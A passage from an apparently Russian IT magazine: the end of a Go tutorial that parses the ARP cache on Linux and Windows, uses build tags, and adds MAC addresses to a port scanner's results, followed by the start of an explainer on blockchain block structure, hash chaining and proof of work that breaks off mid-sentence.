        _, err = net.ParseMAC(macStr)
        if err != nil {
            continue
        }


        result[ipStr] = macStr
    }


    return result
}

Файл /proc/net/arp имеет табличную структуру, в которой нас интересуют
первая и четвертая колонки:


  IP address    HW type    Flags  HW address         Mask  Device
  192.168.0.12  0x1        0x2    1a:90:05:00:01:02   *    enp3s0
  192.168.0.15  0x1        0x2    c6:c4:d3:00:01:02   *    enp3s0
  ...

Стандартная библиотека Go предоставляет средства для работы с файлами,
во многом перекликающиеся с другими языками, например C/C++, и функци‐
ями POSIX. В частности, у нас есть os.Open() для открытия файлов в режиме
«только чтение», она возвращает файловый дескриптор; file.Read() счи‐
тывает содержимое в срез байтов; file.Close() закрывает файл и выс‐
вобождает связанные с ним ресурсы по завершении работы.
   Однако я рекомендую использовать буферизованный ввод‑вывод средс‐
твами пакета bufio для более эффективного расхода ресурсов. Если ты
будешь работать с действительно большими файлами, загружать в память
все содержимое целиком может быть не лучшей идеей, и здесь буфери‐
зованный ввод с построчным чтением придется как нельзя кстати.
   Итак, в начале мы открываем файл на чтение и сразу планируем его зак‐
рытие при выходе из функции с помощью defer .
   Создаем новый буферизованный сканер для содержимого файла и пос‐
трочно считываем его в цикле, пока не будет достигнут конец файла, вызова‐
ми  scanner.Scan() .  Прочитанное  содержимое  возвращает  функция
scanner.Text() . Об этом я подробно писал в предыдущей статье .
   Далее используем функцию TrimSpace() из пакета strings , чтобы обре‐
зать все пробельные символы в начале и конце строки, и пропускаем пустые
строки.


             INFO

                          Пробельные символы — это разделители, исполь‐
                     зуемые для форматирования текста. Кроме собс‐
                           твенно  пробела,  к ним  относятся  табуляция,
                      перевод строки и несколько прочих. Если понадо‐
                             бится, в Go можно проверить, считается ли сим‐
                       вол  пробельным,  вызвав  функцию unicode.
                   IsSpace() .


Затем каждую считанную строку разделим на подстроки в тех местах, где
находятся пробельные символы. Именно это делает еще одна функция
из пакета strings — Fields() , возвращающая срез подстрок. Пробельные
символы при этом исключаются, дополнительно обрезать их не нужно.
  Из этих подстрок первая будет содержать IP-адрес, четвертая — MAC-
адрес.
   Помимо полезных строк с информацией, файл /proc/net/arp может
содержать и то, что нам не нужно, — как минимум заголовок. Поэтому введем
две проверки. Сначала проверим, сколько вообще подстрок получилось пос‐
ле разделения: для описанного формата файла нас интересуют только те
строки, которые разделились не меньше чем на четыре фрагмента.
   Потом воспользуемся функциями пакета net для валидации тех фраг‐
ментов, в которых ожидаем увидеть IP- и MAC-адреса, — попытаемся пре‐
образовать строковые представления в валидные адреса вызовами net.
ParseIP() и net.ParseMAC() соответственно.
   Обрати внимание: семантика функций немного отличается. Если строку
не удается преобразовать в IP-адрес, net.ParseIP() возвращает nil. А вот
net.ParseMAC() возвращает два значения: первое — преобразованный
адрес, второе — ошибку преобразования. Поскольку нас интересует только
факт успешного преобразования, а не его результат, первое значение мы
отбрасываем.
   Наконец, выделив и валидировав интересующие нас фрагменты строки,
мы добавим их в коллекцию результатов.


             INFO

                   Кеш ARP также содержит multicast- и broadcast-
                           адреса, которые нам не нужны. Если хочешь,
                       добавь дополнительную проверку, чтобы отбра‐
                       сывать их. Ее можно реализовать сравнением
                            строки macStr с определенными подстроками
                         или,   разобрав  адрес   с  помощью  net.
                   ParseMAC() , проверкой младшего бита первого
                            байта в возвращаемом адресе, который указыва‐
                         ет на multicast/broadcast. Сейчас эта проверка
                       не выполняется.


В Windows будем работать с командой arp -a . Формат ее вывода примерно
следующий:


  Interface: 192.168.0.50 --- 0x11
  Internet Address      Physical Address      Type
  192.168.0.10          18-0f-76-00-01-02     dynamic
  192.168.0.11          40-cb-c0-00-01-02     dynamic
  ...
  `Interface: 192.168.19.1 --- 0xf  Internet Address      Physical Address
  Type  192.168.19.255        ff-ff-ff-ff-ff-ff     static  224.0.0.2
  01-00-5e-00-00-02     static  ...`
Здесь побольше лишней информации, но на логику обработки это особо
не влияет. Версия для Windows выглядит очень похоже:


func retrieveArpTable() map[string]string {
    result := make(map[string]string)


    // Здесь платформенно зависимый код (Windows)
    data, err := exec.Command("arp", "-a").Output()
    if err != nil {
        return result
    }


    for l := range strings.Lines(string(data)) {
        l = strings.TrimSpace(l)
        if len(l) < 24 {
            continue
        }
        tokens := strings.Fields(l)
        if len(tokens) != 3 {
            continue
        }
        ipStr := tokens[0]
        macStr := tokens[1]
        ip := net.ParseIP(ipStr)
        if ip == nil {
            continue
        }
        _, err = net.ParseMAC(macStr)
        if err != nil {
            continue
        }
        result[ipStr] = macStr
    }


    return result
}

Вместо чтения файла воспользуемся средствами пакета os/exec . Функция
Command() создает команду, позволяющую средствами ОС выполнить задан‐
ную программу, передав ей нужные аргументы.
   Функция Output() запускает созданную команду и возвращает ее вывод
в виде массива байтов, который мы преобразуем в строку.
   Функция Lines() , конечно же, опять из пакета strings , предоставляет
итератор. Не будем погружаться в сложности, скажем лишь, что итератор
последовательно возвращает некоторое количество значений и работает
совместно с range точно так же, как будто мы обходим массив или срез.
  В  случае Lines() будут  возвращаться отдельные  строки из  текста,
переданного аргументом. Это похоже на Fields() , только разделение про‐
исходит не по пробелам, а по переносам строк и результаты возвращаются
не сразу все в срезе, а по одному.
  Ты можешь выбрать нужную версию кода в зависимости от используемой
операционной системы и, запустив его через go run . , проверить, все ли
работает как надо. Закомментируй лишний код или примени динамическое
переключение по значению переменной GOOS во время выполнения прог‐
раммы: if runtime.GOOS == "windows" { ...
   Кстати, если запустишь приложение несколько раз, то заметишь, что
порядок следования результатов всегда разный. Так происходит потому, что
порядок обхода map каждый раз меняется , в отличие от массивов
и срезов, которые всегда обходятся по индексу от нуля по возрастанию.
   Говоря более строгим языком, массивы и срезы представляют собой упо‐
рядоченные (англ. ordered, не путай с сортированными) коллекции, а map —
неупорядоченную.


ТЕГИ СБОРКИ

Теперь рассмотрим другой подход к созданию кросс‑платформенных при‐
ложений: вместо динамического переключения будем выбирать нужный код
на этапе компиляции в зависимости от целевой платформы. Это умень‐
шит число ветвлений, уберет лишний код из бинарника и позволит нагляднее
структурировать исходники.
   Вместо одного файла arp.go создай два с таким же содержанием
и назови их arp_windows.go и arp_linux.go . Помести в них код, соответс‐
твующий операционной системе, указанной в названии:


package main


func retrieveArpTable() map[string]string {
    result := make(map[string]string)
    // TODO здесь платформенно зависимый код Windows/Linux/...
    return result
}




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИКОДИНГ
       GO ПАРСИТЬ!
          ПИШЕМ ПАРСЕР ARP-КЕША,
             ЧТОБЫ ОСВОИТЬ GOLANG




Теперь при сборке бинарника компилятор автоматически будет использовать
тот исходный файл, суффикс имени которого соответствует целевой плат‐
форме.
   Вообще шаблон именования файлов такой: *_GOOS_GOARCH.go , например
source_windows_amd64.go — для Windows и архитектуры x86-64. При этом
тебе никто не запрещает использовать собственные суффиксы в именах,
если они не совпадают с известными значениями GOOS или GOARCH: это не
будет ошибкой, компилятор просто не станет выполнять никаких допол‐
нительных действий.
  А что, если у нас целевая ОС не Windows и не Linux? Выполнив set
GOOS=darwin&& go build . , ты получишь ошибку следующего вида: .\main.
go:6:15: undefined: retrieveArpTable .
   Как следует из текста ошибки, функция retrieveArpTable не определена,
потому что компилятор проигнорировал файлы с суффиксами, не соответс‐
твующими целевой платформе, а других мы ведь не предоставили!
   Исправим ошибку, создав еще один файл, который компилятор сможет
использовать во всех остальных случаях. Чтобы не путаться, назовем его
arp_other.go (можешь использовать другой суффикс по вкусу, например
_default или _fallback).
   Помести в него тот же код, что выше, создав функцию‑заглушку, возвра‐
щающую пустой словарь. Если хочешь, измени сигнатуру функции, чтобы она
возвращала два значения, и пусть вторым будет флаг bool , указывающий
на успешность выполнения.
   Теперь вроде бы все хорошо: мы можем собирать бинарник для любой
платформы... кроме Windows и Linux! Во втором случае мы получаем такую
ошибку:


# readarp
.\arp_windows.go:9:6: retrieveArpTable redeclared in this block
        .\arp_default.go:3:6: other declaration of retrieveArpTable

Понятно: здесь функция с одинаковым именем объявлена два раза в двух
файлах. Сейчас мы это исправим, применив теги, или ограничения, сборки
(build constraints).
   Это комментарий специального формата, начинающийся с //go:build
и содержащий требуемые значения GOOS и GOARCH. Для сложных условий
можно применять скобки и логические операторы: || (или), && (и), ! (не).
Например, //go:build  linux  ||  darwin — файл собирается для Linux
или macOS, а //go:build windows && amd64 — для Windows с архитектурой
x86-64.
   Добавим в самое начало файла arp_other.go , перед package  main ,
строку //go:build !windows && !linux , а после нее — пустую строку. Тем
самым укажем, что этот файл применяется для всех целевых ОС, кроме
Windows и Linux.
  В итоге получаем три файла, и в каждом из них — своя версия реализации
функции retrieveArpTable() : версия из файла arp_windows.go исполь‐
зуется при сборке приложения для Windows, из arp_linux.go — для Linux,
а из arp_other.go — во всех остальных случаях.


             INFO

                   В тегах можно применять и другие ограничения,
                        например версии целевых архитектур  ( amd64.
                   v2 ),  номера  релизов Go  ( go1.12 ),  исполь‐
                       зование  cgo  (инструмент  для  вызова  C-кода
                       из Go). Тег должен помещаться в самом начале
                           файла, перед тегом допускаются только пустые
                            строки  и  комментарии;  после  тега  должна
                          находиться пустая строка. Тег может быть только
                        один, для комбинации  ограничений  используй
                          логические операторы. Подробную информацию
                          смотри в документации или в выводе go help
                   buildconstraint.



Старый синтаксис тегов сборки
Возможно, работая с чужим кодом, ты встретишь теги сборки иного формата,
использовавшегося до Go 1.17. Они начинаются с // +build и используют
менее очевидный синтаксис: запятые как «и», пробелы как «или», ! как «не».
Например: // +build linux darwin — сборка для Linux или macOS, //
+build darwin,cgo linux — для macOS и cgo или для Linux. Таких тегов
может быть несколько; они тоже должны находиться в самом начале файла
и быть отделены от кода пустой строкой. Если файл содержит теги старого
и нового образца, то новые имеют приоритет перед старыми.



СОЗДАЕМ СВОЙ ПАКЕТ

Что ж, давай придумаем нашему коду более интересное применение, чем
вывод на экран информации, которая и так доступна через штатные средства
ОС.
   Здесь и далее я использую проект сканера портов, который мы начали
писать в статье « Go сканить! ». Добавим в него парсер ARP-кеша, чтобы вклю‐
чить  в  результаты  сканирования  информацию о  MAC-адресах  хостов
в локальной сети. Впрочем, тебе никто не мешает использовать любой дру‐
гой проект — в конце концов, именно в этом и вся суть нашего кода: его мож‐
но добавить куда угодно!
  В каталоге portscan в нашем сканере либо в каталоге своего проекта
создай подкаталог arp и перенеси в него три файла arp_*.go (остальное нам
не нужно; main тоже не нужен, потому что наш пакет не имеет точки входа и не
является самостоятельным приложением).
  В этих трех файлах измени название пакета с main на arp ( package arp
в начале файла). Добавь сюда четвертый файл, arp.go , — в нем будет содер‐
жаться интерфейс нашего пакета для взаимодействия с внешним кодом. Наз‐
вание пакета в файле тоже укажи arp, теги сборки не используй — этот файл
должен включаться для любых целей. В итоге должна получиться следующая
структура проекта:


portscan
│   go.mod
│   main.go
│   ports.txt
│   targets.txt
└───arp
        arp.go
        arp_linux.go
        arp_other.go
        arp_windows.go

Теперь в файле arp.go создадим структуру, которая будет нашим «читателем
ARP», с соответствующими методами (если ты знаком с ООП, можешь пред‐
ставить ее как класс). Получаем следующее:


package arp


import "net"


type ArpReader struct {
    cache map[string]string
}


func NewArpReader() *ArpReader {
    a := &ArpReader{}
    a.cache = retrieveArpTable()
    return a
}


func (a *ArpReader) GetMac(host string) (string, bool) {
    if a.cache == nil {
        return "", false
    }
    val, found := a.cache[host]
    return val, found
}

Сначала мы объявили новый тип данных — структуру ArpReader с полем
cache .
   Далее  у нас  есть  функция‑фабрика  (factory  function) NewArpReader,
которая инициализирует экземпляр типа ArpReader и возвращает указатель
на него. Фабрика играет ту же роль, что и конструктор в ООП. Чтобы людям,
читающим твой код, было сразу понятно, фабрики принято называть словом
New + имя типа, как и сделано в нашем примере.
  В коде фабрики мы вызываем все ту же функцию retrieveArpTable() ,
которую написали ранее, и присваиваем возвращенный ею словарь полю
cache .
   Получается, что инициализированный экземпляр структуры ArpReader
хранит определенное состояние — данные, переданные внутри фабрики. Мы
возвращаем указатель на экземпляр, позволяя другому коду взаимодейство‐
вать с этим состоянием.
   Далее объявляем метод структуры GetMac() . Это функция, которая при‐
нимает адрес хоста и возвращает соответствующий ему аппаратный адрес
из ранее заполненного хранилища.
   Если адрес найден, вторым значением возвращается true , в противном
случае — false .
   Чтобы отличить функцию от метода, используют специальную конструкцию
под названием получатель (receiver). Он указывается в скобках перед име‐
нем функции: (a *ArpReader) .
   Использовав получатель, мы сообщаем компилятору, что эта функция —
метод, и получаем возможность вызывать ее через точку после имени экзем‐
пляра структуры. С другой стороны, получатель позволяет внутри метода
обращаться к полям и другим методам экземпляра указанного типа: a.cache
дает доступ к полю cache .


Подробнее о получателях
Существует два вида получателей. Получатель‑указатель (pointer receiver)
объявляется как указатель, со значком звездочки — (a  *ArpReader) , —
и дает коду метода доступ к указателю на экземпляр структуры. Тем самым он
позволяет методам изменять внутреннее состояние экземпляра. Получа‐
тель‑значение (value receiver) объявляется как значение переменной — (a
ArpReader) — и предоставляет коду метода копию экземпляра структуры.
   Соответственно, первый получатель (по указателю) используем для изме‐
нения состояния структуры и во избежание копирования больших структур;
второй получатель (по значению) используем, когда, наоборот, требуется
обеспечить  неизменность  состояния  экземпляра  структуры  либо  если
намереваемся вернуть из метода новый экземпляр.
  При этом в Go не принято смешивать типы получателей для методов одной
структуры, и обычно их делают одинаковыми — все как указатели или все
как значения. В нашем конкретном примере нет особой разницы: во‑первых,
мы не меняем состояние, а только читаем данные; во‑вторых, даже если бы
и меняли — тип map внутри себя и так содержит указатель на данные, и,
работая с копией переменной типа map, мы работаем все с тем же набором
данных.



Обрати внимание на прописные и строчные буквы. Как мы уже говорили,
импортировав пакет, мы будем видеть только так называемые экспортиру‐
емые объявления, то есть те, имена которых начинаются с заглавной буквы.
Мы используем эту особенность именования, чтобы скрыть внутреннюю
реализацию нашего пакета. Ни поле cache , ни ранее определенная функция
retrieveArpTable() не будут видны извне!
   Так мы реализуем принцип, известный как инкапсуляция: объединяем
данные и работающий с ними код в единую сущность и скрываем детали
реализации от внешнего мира. В результате мы позволяем получать доступ
к данным через метод GetMac() , но не даем возможности эти данные редак‐
тировать или, скажем, добавлять новые записи во внутреннее хранилище
cache .


             INFO

                   В других языках программирования, например C,
                       для обозначения  указателя на экземпляр  объ‐
                           екта, с которым работаем в настоящее время,
                             часто используют имена this или self . В Go
                          принято давать более короткие имена, обычно
                      по первой букве соответствующего типа. Поэтому
                  мы используем (a *ArpReader) , а не, нап‐
                       ример, (self *ArpReader) .


А что, если пользователь нашего пакета проигнорирует наш неявный контракт
и не воспользуется фабрикой? Действительно, ничто не мешает сделать так:


// Вместо reader := NewArpReader()
reader := ArpReader{}
mac, found := reader.GetMac("first")

В этом случае поле cache остается неинициализированным. Как мы уже зна‐
ем, это не большая проблема в Go благодаря механизму значений по умол‐
чанию. Здесь cache получит значение nil, и, когда мы обратимся к нему
в методе GetMac() , сработает проверка if a.cache == nil.
  На самом деле эта проверка здесь даже лишняя, потому что Go допускает
чтение из nil-словаря: первым вернется значение по умолчанию, а вторым —
false, то есть мы и так получим ("", false). А вот если мы соберемся писать
в словарь, то проверка обязательно понадобится.
   Как заставить пользователя следовать контракту? Да очень просто: дела‐
ем структуру неэкспортируемой, записав ее имя с маленькой буквы. Теперь
пользователь не сможет создать ее экземпляр напрямую, но это не помешает
обращаться к экспортируемым полям и методам.
  Наш итоговый код в файле arp.go (как видишь, я убрал ненужную провер‐
ку и переписал инициализацию — фактически поведение осталось тем же,
просто запись стала лаконичнее):


package arp


import "net"


type arpReader struct {
    cache map[string]string
}


func NewArpReader() *arpReader {
    return &arpReader{
        cache: retrieveArpTable(),
    }
}


func (a *arpReader) GetMac(host string) (string, bool) {
    val, found := a.cache[host]
    return val, found
}


Обработка ошибок
Наша текущая реализация молча игнорирует возможные ошибки, например
неподдерживаемые версии ОС (функция retrieveArpTable() из файла
arp_other.go просто вернет пустой словарь). Ты можешь сделать явный воз‐
врат  ошибок,  добавив  второе  возвращаемое  значение  типа   error
в retrieveArpTable() и, соответственно, в NewArpReader() . Тем самым
пользователь пакета будет обязан проверить ошибку и предпринять какие‑то
действия при ее возникновении, например:


 if r, err := NewArpReader(); err != nil {
     log.Fatal(err)
 }
 mac, found := r.GetMac("first")




Наконец, воспользуемся созданным нами пакетом. В основном коде сканера,
в  файле  main.go ,  импортируем  его,  добавив  строку  "portscan/arp"
в import. Далее создадим поле Mac типа string в структуре ScanResult .
   Затем   в   функции  run()   инициализируем   экземпляр  вызовом
NewArpReader() , а внутри цикла сканирования для каждого нового хоста
будем извлекать аппаратный адрес:


type ScanResult struct {
    Host   string
    Port   string
    Mac    string
    Banner string
}
// ...
func run() (err error) {
    // ...
    arpReader := arp.NewArpReader()
    // ...
    for scanner.Scan() {
        // ...
        mac, found := arpReader.GetMac(target)
        if found {
            fmt.Println(mac)
        }
        // ...
        result.Mac = mac
        // ...
    }
}


        WWW

                        Полный код примера на GitHub



Теперь, когда запустишь пример, увидишь, что в результатах добавилось
поле с MAC-адресом.





                            Результаты сканирования

Вот и все на сегодня, а в следующей статье начнем разбирать многопоточ‐
ность, что позволит писать по‑настоящему быстрые приложения. © X
GEEK





Блокчейн окружен таким количеством хай‐
па, что за ним  сложно  разглядеть  тех‐
нологию. В этой статье мы отбросим мар‐
кетинг и разберем инженерные  особен‐                                                                           Валентин Холмогоров
                                                                               Ведущий редакторности блокчейна: как устроен блок, какие                                                                                                valentin@holmogorov.ru
поля содержатся в его заголовке, как хеши
связывают блоки в цепочку, почему изме‐
нить  старую  запись  невозможно и  как
тысячи независимых друг от друга компь‐
ютеров договариваются о единой версии
истории без центрального сервера.


             INFO

                      Это вторая статья из цикла, посвященного тех‐
                         ническим основам устройства криптовалют. Пер‐
                       вая носит название « Крипта с нуля. Разбираемся
                        с алгоритмами в основе криптовалют ».


3 января 2009 года, где‑то около семи вечера по Гринвичу, на ничем не при‐
мечательном компьютере запускается программа. Через несколько минут
она генерирует первый блок данных и записывает в него короткую фразу —
заголовок из свежей газеты The Times: «Канцлер на грани второго спасения
банков». Автор программы — человек, которого никто никогда не видел, —
подписывается псевдонимом Сатоси Накамото и вскоре исчезает из пуб‐
личного пространства, оставив после себя технологию, ставшую основой
крупнейшей криптовалютной экосистемы мира.
   Это известная история, затертая до дыр, ее пересказывают в каждой вто‐
рой статье про криптовалюты. Я вспомнил о ней не в качестве очередного
экскурса в прошлое, а ради одной детали — той самой газетной цитаты, вби‐
той в первый блок, так называемый генезис‑блок  блокчейна. Накамото
поместил ее туда не из литературных соображений — это была подпись,
доказательство, что блок создан не раньше 3 января 2009 года, потому что
до  указанной даты  этого номера The Times  просто не  существовало.
И одновременно — манифест: банковская система трещит по швам, мы стро‐
им другую. С этой фразы и начался биткоин.
   Точнее, не сам биткоин, а блокчейн — технология, которую Накамото под‐
робно описал в своей работе «Bitcoin: A Peer-to-Peer Electronic Cash System»,
опубликованной в интернете 31 октября 2008 года. Если говорить кратко, то
блокчейн — это технологическая основа, поверх которой могут быть запуще‐
ны различные приложения, а биткоин всего лишь одно из них. Фактически
история технологий сделала очередной виток: когда‑то одним из первых
прикладных приложений, работающих поверх интернета, стала электронная
почта, и только потом к ней подтянулись браузеры, файлообменники и прочий
полезный софт. Сейчас на блокчейне построено столько всего, что голова
идет кругом: от криптобирж и NFT до систем голосования, земельных кадас‐
тров и цепочек поставок фармацевтики. Биткоин просто был первым при‐
ложением, построенным на этой технологии.
   Генезис‑блок задает стартовую точку блокчейна и не ссылается на пре‐
дыдущий блок, потому что его попросту нет в природе. Именно поэтому точ‐
ная дата создания  этого самого первого  блока  критически  важна. Его
параметры жестко зашиты в исходный код биткоин‑клиента, чтобы каждая
нода начинала проверку цепочки с одной и той же основы.


КАК УСТРОЕН БЛОКЧЕЙН

Если отбросить маркетинговую шелуху — а ее вокруг темы накопилось
на пару товарных вагонов и маленькую тележку, — блокчейн устроен доволь‐
но просто: это база данных. Не самая быстрая, не самая удобная, с кучей
ограничений, но у нее есть одно ключевое свойство, которого нет ни у одной
классической СУБД: записи в ней невозможно отредактировать задним чис‐
лом. Это математически невозможно, даже если этим займутся на досуге
АНБ, ЦРУ и парочка правительств каких‑нибудь мировых сверхдержав. При‐
чем реализовано это не с помощью какой‑то древней черной магии, а пос‐
редством трех давно известных инженерных трюков, использованных в пра‐
вильном порядке.
   Вторая особенность вытекает из первой: раз никто не может подделать
записи, то и доверять одному конкретному хранителю базы больше не нужно.
Можно раздать копии всем желающим, и, если кто‑то попытается жульничать,
остальные моментально это заметят. В блокчейне нет главного сервера, нет
администратора с правами root , нет банка, который однажды решит, что твой
счет пришло время заблокировать. Это звучит как анархистская утопия,
но технология работает — уже много лет подряд, без единого серьезного
сбоя сети (отдельные биржи и кошельки — это совсем другой разговор,
к самому блокчейну отношения не имеющий).





Ну а теперь давай заглянем этому самому блокчейну под капот, разберемся,
что такое блок и почему его называют именно «блок», а не, скажем, «запись»
или «строка». Посмотрим, как блоки соединяются в цепочку и почему эта
сцепка крепче любого амбарного замка. Поймем, как тысячи независимых
компьютеров умудряются договариваться о единой версии истории тран‐
закций без начальника и арбитра. И в конце разложим по полочкам три раз‐
новидности блокчейнов — публичные, приватные и консорциумные, а заодно
поймем, почему за одним словом скрываются принципиально разные кон‐
цепции.


ЧТО ТАКОЕ БЛОК И ИЗ ЧЕГО ОН СОСТОИТ?

Слово «блок» звучит монументально — и поэтому сбивает с толку. На самом
же деле это просто пакет данных с определенной структурой, почти как в
обычной базе данных. Возьмем для примера блокчейн, на котором построен
биткоин: здесь блок состоит из двух частей — заголовка и тела.
  С телом, занимающим самый большой объем блока, все просто: оно
содержит список транзакций. «Аня отправила Диме 0,01 BTC», «Вася отпра‐
вил Маше 0,3 BTC» — и так далее, сколько влезет. В один блок блокчейна
в сети биткоин помещается две‑три тысячи транзакций, иногда больше.
К слову, самая первая пользовательская транзакция с биткоином произош‐
ла 12 января 2009 года: Сатоси Накамото отправил 10 BTC американскому
программисту и криптографу Хэлу Финни, и эта операция была подтверждена
в блоке № 170. Короче, если представить, что блок — это железнодорожный
вагон, доверху наполненный зерном, то зерно (составляющее основную мас‐
су и полезное содержимое вагона) — это как раз записи о транзакциях.





А вот заголовок — штука поинтереснее. Он маленький, всего 80 байт,
но именно в нем спрятана вся механика, на которой работает блокчейн.
В сети биткоин заголовок содержит шесть полей:
 • Версия протокола — техническое поле, содержимое которого сообщает
   другим узлам сети, по каким правилам обрабатывать блок.
 • Хеш предыдущего блока — а вот это самое важное поле во всей конс‐
   трукции. Именно оно превращает набор разрозненных блоков в цепочку.
   Каждый блок хранит в себе «отпечаток пальца» предыдущего — 256-бит‐
  ный хеш, вычисленный по алгоритму SHA-256. Зачем — подробно раз‐
  берем в следующем разделе, пока просто запомни: это поле и есть самое
   важное звено в цепи.
 • Корень Меркла (Merkle root) — это хеш всех транзакций в теле блока,
   свернутый в одно 256-битное число. Работает это так: транзакции раз‐
   биваются на пары, от каждой пары считается хеш, потом хеши снова раз‐
   биваются на пары, снова хешируются — и так до тех пор, пока не останет‐
   ся одно значение. Получается дерево, где корень — единственное число,
   которое изменится, если изменить хотя бы один бит хоть в одной тран‐
   закции. Зачем такие сложности? Затем, что хранить в заголовке тысячи
   транзакций целиком физически невозможно, а корень Меркла позволяет
  одним значением «запечатать» все тело блока, сделав невозможным его
   незаметное изменение.
 • Временная метка — Unix timestamp, показывает, сколько секунд прошло
   с 1 января 1970 года. У генезис‑блока, того самого, с цитатой из газеты,
   метка имеет значение 1231006505 — 3 января 2009 года, 18:15:05 UTC.
   Метка нужна для порядка и для корректировки сложности майнинга: сеть
   следит за тем, как быстро появляются новые блоки, и при необходимости
   корректирует процесс.
 • Биты сложности (difficulty target) — компактная запись значения, ниже
   которого должен оказаться хеш блока, чтобы сеть его приняла. Чем мень‐
  ше это число, тем сложнее найти подходящий хеш. Именно это поле
   регулирует скорость майнинга и поддерживает среднее время появления
   нового блока. Биты сложности показывают, насколько трудно сейчас найти
   новый блок в сети биткоин. Сеть настроена таким образом, чтобы новый
   корректный блок в цепочке появлялся примерно раз в десять минут,
   над этой задачей трудятся майнеры. Если в какой‑то момент майнеров
   становится много и общая вычислительная мощь сети возрастает, сеть
   автоматически делает задачу труднее, если мощности стало меньше,
   задача упрощается. Биты сложности как раз и позволяют управлять этим
   процессом.
 • Нонс (nonce, от number used once) — четырехбайтовое число, которое
   майнер перебирает вслепую, пытаясь подобрать такое значение, чтобы
  хеш всего заголовка оказался меньше целевого порога сложности. Этот
   процесс называют «вычислительной работой», proof of work: иного три‐
   виального способа найти нонс не существует, только перебор. Майнер
   меняет нонс, считает SHA-256 от заголовка, смотрит результат — и, если
   он не подошел, меняет снова, миллиарды раз подряд, пока не повезет.

Вот, собственно, и весь блок: тело с транзакциями и заголовок с шестью
полями.





Обрати внимание на два поля заголовка: хеш предыдущего блока и корень
Меркла — это так называемые криптографические хеши. Они намертво при‐
вязывают блок к двум вещам: к предыдущему блоку и к собственному содер‐
жимому. Измени один байт в любой транзакции — изменится корень Меркла.
Изменится корень Меркла — изменится хеш всего заголовка. А этот хеш
записан в следующем блоке, поэтому при его изменении цепочка разор‐
вется, что и делает любое изменение содержимого блокчейна задним числом
физически невозможным.


СКОВАННЫЕ ОДНОЙ ЦЕПЬЮ

Когда майнер собирает новый блок, он включает в его заголовок хеш пре‐
дыдущего блока, который добавляется в поле prev_block_hash . Всё, связь
установлена. Блок № 638 201 содержит хеш блока № 638 200, тот — хеш бло‐
ка № 638 199, и так далее вниз, до самого генезис‑блока с газетным заголов‐
ком из The Times. Получается что‑то вроде бусин на нитке — с той разницей,
что нитка здесь не физическая, а математическая. Каждая бусина «помнит»
значение предыдущей, причем абсолютно точно, до последнего бита.
  А теперь давай на минуточку представим, что кто‑то вдруг захотел подпра‐
вить старую транзакцию. Например, в блоке № 638 100 записано, что Вася
отправил Пете 2 BTC. Злоумышленник хочет эту запись стереть — сделать
вид, что перевода не было, и потратить те же монеты еще раз.
   Злоумышленник открывает блок № 638 100 и меняет транзакцию. В тот же
момент меняется корень Меркла — потому что дерево хешей пересчитыва‐
ется снизу вверх и любое изменение в любом месте блока меняет это зна‐
чение.  Изменился корень Меркла —  изменился  заголовок.  Изменился
заголовок — изменился хеш блока. А этот хеш записан в заголовке сле‐
дующего блока № 638 101. Значит, блок № 638 101 теперь содержит неп‐
равильную ссылку: любая нода сети проверит хеш, и, если он не сойдется,
блок будет отвергнут.
   Ладно, думает злоумышленник. Я пересчитаю и блок № 638 101 тоже, под‐
ставлю новый хеш, подберу новый нонс, чтобы блок снова удовлетворял
порогу сложности. Но тогда изменится хеш блока № 638 101 — а он записан
в блоке № 638 102. Значит, пересчитывать нужно и его, и следующий, и сле‐
дующий за ним — все блоки от точки подделки до конца цепочки.
  И вот тут вступает в игру экономика. На момент написания этой статьи
(апрель 2026 года) в цепочке биткоина содержится 945 339 блоков. Каждый
из них был найден майнерами путем перебора нонсов, и это потребовало
колоссальной вычислительной работы — собственно, в этом и кроется суть
майнинга: он защищает сеть от злодеев, желающих что‑то поменять в блок‐
чейне.





Пересчитать один блок — значит заново выполнить весь этот перебор,
пересчитать тысячу блоков — проделать эту работу заново тысячу раз. При‐
чем не просто пересчитать всю цепочку от точки подделки, а пересчитать ее
быстрее, чем это сделает вся остальная сеть — ведь она тоже не стоит
на месте. Пока злоумышленник пересчитывает старые блоки, остальные учас‐
тники блокчейна продолжают майнить новые. Обогнать их физически невоз‐
можно: ни у одного злоумышленника на нашей планете нет таких вычис‐
лительных мощностей.
   Сатоси  в  своем  основополагающем  труде  «Bitcoin: A  Peer-to-Peer
Electronic Cash System» прикинул вероятность успеха такой атаки. Если зло‐
умышленник  контролирует меньше 50% вычислительной мощности сети,
вероятность догнать честную цепочку блокчейна падает экспоненциально
с каждым новым блоком. После шести подтверждений (то есть после появ‐
ления шести новых блоков после блока, содержащего твою транзакцию)
вероятность успешной подделки  уходит в область  статистически невоз‐
можного. Именно поэтому шесть подтверждений —  стандартный порог
для крупных транзакций в биткоине: после шести блоков можно считать, что
запись о твоей транзакции навечно высечена в граните.
   Ну а чтобы контролировать более 50% вычислительной мощности сети,
нужно закупить оборудования, по разным оценкам, примерно на пару десят‐
ков миллиардов долларов — и это только железо, без учета электричества.
Плюс, если рынок узнает о подобной попытке (а он обязательно узнает), курс
криптовалюты сразу же рухнет и майнинг обесценится раньше, чем атака
завершится. Экономически это самоубийственно.
   Вот так довольно‑таки простые вещи — криптографический хеш, пос‐
ледовательная ссылка на предыдущий блок и proof of work — складываются
в единую систему, где подделка совершённых транзакций не просто зап‐
рещена  правилами, а сделана нерентабельной на физическом  уровне.
Переписать прошлое в блокчейне нельзя не потому, что администратор этого
не разрешит, а потому, что на нашей маленькой планете банально не хватит
на такой подвиг электричества.


РАСПРЕДЕЛЕННЫЙ РЕЕСТР: У ВСЕХ ОДИНАКОВАЯ КОПИЯ

До сих пор мы говорили о блоках и цепочке так, будто она существует
в единственном экземпляре, лежит где‑то в палате мер и весов и кто‑то ее
обслуживает.  Уничтожь  эту  цепочку целиком — и  криптовалюта умрет.
Но главный прикол всей этой системы заключается в том, что экземпляров
блокчейна на самом деле десятки тысяч. И никто из тех, кто их хранит, друг
другу не доверяет.
   Блокчейн биткоина — это одноранговая сеть (peer-to-peer, P2P), устро‐
енная по тому же самому принципу, что и знакомые всем нам торренты,
с использованием которых мы качаем варез полезный софт. Нет централь‐
ного сервера, нет главной ноды, нет привилегированного узла, который
решает, какая версия цепочки правильная. Есть несколько десятков тысяч
компьютеров по всему миру, от промышленных серверов в дата‑центрах
до ноутбуков в чьей‑нибудь спальне, — и каждый из них хранит полную копию
всей цепочки, начиная с генезис‑блока и до последнего подтвержденного.
На момент написания этих строк в сети биткоин это 491,5 Гбайт данных.
   Когда майнер создает новый блок, он рассылает его соседним нодам. Те
